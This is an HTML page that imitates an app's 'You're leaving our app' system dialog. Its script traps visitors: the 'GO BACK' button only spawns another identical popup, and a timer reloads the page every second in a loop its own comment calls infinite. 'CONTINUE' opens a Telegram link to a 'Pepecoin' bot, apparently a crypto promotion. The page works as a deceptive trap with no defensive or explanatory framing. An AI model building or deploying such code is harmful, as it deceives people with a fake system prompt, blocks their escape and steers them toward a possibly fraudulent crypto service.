<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Leaving App Dialog</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; overflow: hidden; }

  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.5);
  }

  #popup-container {
    position: fixed;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    pointer-events: none;
  }

  .card {
    position: absolute;
    background: #fff;
    border-radius: 8px;
    padding: 24px;
    margin: 0 24px;
    max-width: 400px;
    width: calc(100% - 48px);
    animation: fadeSlideIn 0.4s ease;
    pointer-events: auto;
  }

  @keyframes fadeSlideIn {
    from { opacity: 0; transform: translateY(30px) scale(0.95); }
    to { opacity: 1; transform: translateY(0) scale(1); }
  }

  .card h1 {
    font-size: 20px;
    font-weight: 400;
    color: #1a1a1a;
    margin-bottom: 16px;
  }

  .card p {
    font-size: 14px;
    line-height: 1.6;
    color: #1a1a1a;
    margin-bottom: 24px;
  }

  .buttons {
    display: flex;
    align-items: center;
    justify-content: flex-end;
    gap: 24px;
  }

  .buttons button {
    background: none;
    border: none;
    font-size: 14px;
    font-weight: 600;
    letter-spacing: 0.5px;
    cursor: pointer;
    transition: color 0.2s;
  }

  .btn-back { color: #1a1a1a; }
  .btn-back:hover { color: #1a1a1a; }

  .btn-continue { color: #1a1a1a; }
  .btn-continue:hover { color: #3b82f6; }
</style>
</head>
<body>

<div class="overlay"></div>
<div id="popup-container"></div>

<script>
  var container = document.getElementById('popup-container');
  var zIndex = 100;

  function createPopup() {
    var card = document.createElement('div');
    card.className = 'card';
    card.style.zIndex = zIndex++;
    card.innerHTML =
      '<h1>You\'re leaving our app</h1>' +
      '<p>The website you\'re viewing is attempting to open an external app. Would you like to continue?</p>' +
      '<div class="buttons">' +
        '<button class="btn-back" onclick="goBack()">GO BACK</button>' +
        '<button class="btn-continue" onclick="continueAction()">CONTINUE</button>' +
      '</div>';
    container.appendChild(card);
  }

  function goBack() {
    createPopup();
  }

function continueAction() {
  // Open the external link in a new tab/window
  window.open('https://t.me/Pepecoin_bot_bot/startapp', '_blank');
}
  createPopup(); // This will create the initial popup when the page loads

  // Create an infinite redirect loop
  function infiniteRedirect() {
    setTimeout(function() {
      window.location.href = window.location.href; // Reload the current page
    }, 1000); // Redirect after 1 second
  }

  infiniteRedirect(); // Initiate the redirect loop
</script>

</body>
</html>
